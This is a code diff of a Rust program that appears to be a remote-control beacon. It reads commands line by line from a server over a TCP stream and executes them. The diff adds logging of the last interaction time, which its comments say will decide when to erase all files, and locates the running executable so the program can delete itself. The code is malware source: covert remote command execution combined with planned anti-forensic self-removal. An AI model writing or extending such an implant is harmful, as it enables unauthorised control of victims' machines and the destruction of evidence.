@@ -1,6 +1,7 @@
 use std::process::Command;
 use std::io::BufReader;
 use std::io::BufRead;
+use std::fs::OpenOptions;
 use std::io::BufWriter;
 use std::io::Write;
 use std::net::SocketAddr;
@@ -10,8 +11,9 @@ use std::time::{Duration, Instant};
 use std::fs::File;
 use std::io::prelude::*;
 use std::env;
+use chrono::prelude::*;
 
-
+///used to set the timeout to stop the beacon 
 const TIMEOUT:u64=60;
 //use std::os::unix::net::SocketAddr;
 
@@ -48,6 +50,17 @@ fn execute_commands(command: &str) -> Resultat {
     let e = String::from_utf8_lossy(&output.stderr).to_string();   
     let results = create_resultat(s, o, e);
     results
+}
+
+/// upload the last interaction date. Hence we can say how much time has passed since the last interaction => when to erase all the files
+fn upload_date(stream: &str){
+    println!("upload de la date");
+    let mut file = OpenOptions::new()
+        .write(true)
+        .append(true)
+        .open("src/date.txt")
+        .unwrap();
+    writeln!(file,"{}",stream).expect("Unable to write file");
 }
 
 
@@ -109,8 +122,13 @@ fn main(){
     let mut reader = BufReader::new(&stream);
     let mut writer = &stream;
     let mut line = String::new();
+
+    /// finds the path to the exe we are running => 
+    ///will be used to delete it (remove current exe) and print("failed to ....") error if not found
     let exe_path = env::current_exe().expect("failed to ....");
     println!("{}", exe_path.display());
+    let utc: DateTime<Utc> = Utc::now(); 
+    upload_date(&format!("{}",utc));
     let lines_server = reader.lines().fuse();
     for l in lines_server {
         line = l.unwrap();
